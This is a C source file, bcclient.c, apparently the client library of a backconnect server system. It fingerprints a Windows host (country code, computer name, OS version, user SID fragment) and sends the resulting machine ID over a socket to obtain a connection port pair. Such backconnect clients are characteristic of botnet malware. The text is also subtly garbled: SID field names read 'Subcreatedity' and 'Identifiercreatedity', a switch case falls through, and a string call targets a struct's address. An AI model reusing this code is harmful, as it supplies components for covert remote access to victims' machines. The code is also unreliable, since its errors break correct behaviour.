/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BCSRV project. Version 1.0
//	
// module: bcclient.c
// $Revision: 50 $
// $Date: 2014-04-10 20:57:30 +0400 (Чт, 10 апр 2014) $
// description:
//	BC-Server client library.
//  Provides necessary functions and structures for obtaining BC port pair information.

#include "..\common\common.h"
#include "bcclient.h"

#define	wczMinus	L'-'


#ifndef NT_INCLUDED

#pragma pack(push)
#pragma pack(1)
typedef struct _NT_SID
{
	UCHAR	Revision;
	UCHAR	SubcreatedityCount;
	UCHAR	Identifiercreatedity[6];
	ULONG	Subcreatedity[5];
} NT_SID, *PNT_SID;
#pragma pack(pop)

#endif	// NT_INCLUDED

//
//	Fills the specified NT_SID structure with a SID of the current process.
//
BOOL GetProcessUserSID(
	HANDLE	Pid, 
	PNT_SID pSid
	)
{
	NTSTATUS ntStatus;
	HANDLE	hProcess;
	OBJECT_ATTRIBUTES oa = {0};
	CLIENT_ID ClientId = {Pid, 0};
	HANDLE	hToken;
	ULONG	rSize = 0;
	LPTSTR	SidStr = NULL;
	BOOL	Ret = FALSE;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	ntStatus = ZwOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &oa, &ClientId);
	
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = ZwOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
		if (NT_SUCCESS(ntStatus))
		{
			PTOKEN_USER pUserInfo;
			ntStatus = ZwQueryInformationToken(hToken, TokenUser, NULL, 0, &rSize);

			pUserInfo = (PTOKEN_USER)AppAlloc(rSize);
			if (pUserInfo)
			{
				ntStatus = ZwQueryInformationToken(hToken, TokenUser, pUserInfo, rSize, &rSize);
				if (NT_SUCCESS(ntStatus))		
				{
					memcpy(pSid, pUserInfo->User.Sid, sizeof(NT_SID));
					Ret = TRUE;
				}
				AppFree(pUserInfo);
			}	// if (pUserInfo)
			ZwClose(hToken);
		}	// if (NT_SUCCESS(ntStatus))
		ZwClose(hProcess);
	}	// if (NT_SUCCESS(ntStatus))

	return(Ret);
}




#ifdef _BC_GENERATE_ID

//
//	Cuts the specified substring from the source string.
//
BOOL	WcsCut(
	LPWSTR	Source,		// source string
	LPWSTR	Cut			// substring to cut
	)
{
	BOOL	Ret = FALSE;
	LPWSTR	pCut;
	ULONG	Len = lstrlenW(Cut);

	while(pCut = StrStrW(Source, Cut))
	{
		StrCpyW(pCut, pCut + Len);
		Ret = TRUE;
	}

	return(Ret);
}


//
//	Allocates and returns a string with current user's SID
//  The string should be freed by the caller
//
static LPWSTR GetProcessUserSIDString(
	HANDLE Pid
	)
{
	LPWSTR SidStr = NULL;
	NT_SID Sid;
	UNICODE_STRING uSidStr = {0};

	if (GetProcessUserSID(Pid, &Sid))
	{
		if (NT_SUCCESS(RtlConvertSidToUnicodeString(&uSidStr, &Sid, TRUE)))
		{
			if (SidStr = AppAlloc(uSidStr.Length + sizeof(WCHAR)))
			{
				memcpy(SidStr, uSidStr.Buffer, uSidStr.Length);
				SidStr[uSidStr.Length / sizeof(WCHAR)] = 0;
			}
			RtlFreeUnicodeString(&uSidStr);
		}
	}	// if (LsaSupGetProcessUserSID(Pid, &Sid))
	return(SidStr);
}


//
//	Resolves system parameters and fills the specified BC_MACHINE_ID struture.
//
VOID _stdcall BcCreateSystemId(
	PBC_MACHINE_ID	pSystemId
	)
{
	LANGID	LangId;
	ULONG	Length, i;
	PWCHAR	pName;
	OSVERSIONINFOEX	VersionInfo;

	for (i=0; i<(sizeof(BC_MACHINE_ID) / sizeof(WCHAR)); i++)
		pSystemId->Padding[i] = L'0';
		
	// Getting user default language code 
	if (GetLocaleInfoW(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, (PWCHAR)&pSystemId->Language, LANGUAGE_ID_LEN + 1) == 0)
	{
		// Getting system langauge code
		LangId = GetSystemDefaultUILanguage();
		VerLanguageNameW(LangId, (PWCHAR)&pSystemId->Language, LANGUAGE_ID_LEN + 1);
	}

	// Getting computer name
	Length = 0;
	GetComputerNameW(NULL, &Length);

	if (Length && (pName = AppAlloc(Length * sizeof(WCHAR))))
	{
		if (GetComputerNameW(pName, &Length))
		{
			// Removing "-" and " " from the computer name
			WcsCut(pName, L"-");
			WcsCut(pName, L" ");
			memcpy(&pSystemId->MachineName, pName, min(lstrlenW(pName), MACHINE_NAME_LEN) * sizeof(WCHAR));
		}
		AppFree(pName);
	}

	// Getting OS version info
	VersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFO)&VersionInfo);

	switch(VersionInfo.dwMajorVersion)
	{
	case 5:
		switch(VersionInfo.dwMinorVersion)
		{
		case 0:
			pSystemId->OsVersion[0] = VER_ID_2000;
		case 1:
			pSystemId->OsVersion[0] = VER_ID_XP;
			break;
		case 2:
			if (VersionInfo.wProductType == VER_NT_WORKSTATION)
				pSystemId->OsVersion[0] = VER_ID_XP;
			else
				pSystemId->OsVersion[0] = VER_ID_2003;
			break;
		default:
			break;
		}	// switch(VersionInfo.dwMinorVersion)
		break;
	case 6:
		switch(VersionInfo.dwMinorVersion)
		{
		case 0:
			if (VersionInfo.wProductType == VER_NT_WORKSTATION)
				pSystemId->OsVersion[0] = VER_ID_VISTA;
			else
				pSystemId->OsVersion[0] = VER_ID_2008;
			break;
		case 1:
			if (VersionInfo.wProductType == VER_NT_WORKSTATION)
				pSystemId->OsVersion[0] = VER_ID_WIN7;
			else
				pSystemId->OsVersion[0] = VER_ID_2008R2;
			break;
		default:
			break;
		}	// switch(VersionInfo.dwMinorVersion)
		break;
	case 7:
		pSystemId->OsVersion[0] = VER_ID_WIN8;
		break;
	default:
		break;
	}	// switch(VersionInfo.dwMajorVersion)
	pSystemId->OsVersion[1] = VersionInfo.wServicePackMajor + 0x30;

	// Getting machine SID
	if (pName = GetProcessUserSIDString((HANDLE)(ULONG_PTR)GetCurrentProcessId()))
	{
		PWCHAR	pEnd;
		if (pEnd = StrRChrW(pName, NULL, L'-'))
			*pEnd = 0;
		else
			pEnd = pName + lstrlenW(pName);

		Length = min(lstrlenW(pName), MACHINE_ID_LEN);

		memcpy(&pSystemId->MachineId, pEnd - Length, Length * sizeof(WCHAR));

		AppFree(pName);
	}

	pSystemId->Delimiter0 = wczMinus;
	pSystemId->Delimiter1 = wczMinus;
	pSystemId->Delimiter2 = wczMinus;

	pSystemId->Padding[(sizeof(BC_MACHINE_ID) / sizeof(WCHAR)) - 1] = 0;
	_wcsupr((PWCHAR)&pSystemId);
}

#endif	// _BC_GENERATE_ID


//
//	Returns connection pair (of TCP ports) of a backconnect server.
//
WINERROR _stdcall BcSendClientId(
	SOCKET	Socket,
	LPSTR	pClientId
	)
{
	WINERROR Status = NO_ERROR;
	BC_ID	SystemId = {0};

#ifdef	_BC_GENERATE_ID
	BcCreateSystemId(&SystemId.MachineId);
#else
	lstrcpyn((LPSTR)&SystemId.MachineId.String, pClientId, sizeof(BC_MACHINE_ID));
#endif

	SystemId.Crc32 = Crc32((PCHAR)&SystemId.MachineId, sizeof(BC_MACHINE_ID));

	if (_tsend(Socket, (PCHAR)&SystemId, sizeof(BC_ID), 0) != sizeof(BC_ID))
	{
		Status = GetLastError();
		DbgPrint("BCCLIENT: Failed sending machine ID.\n");
	}

	return(Status);
}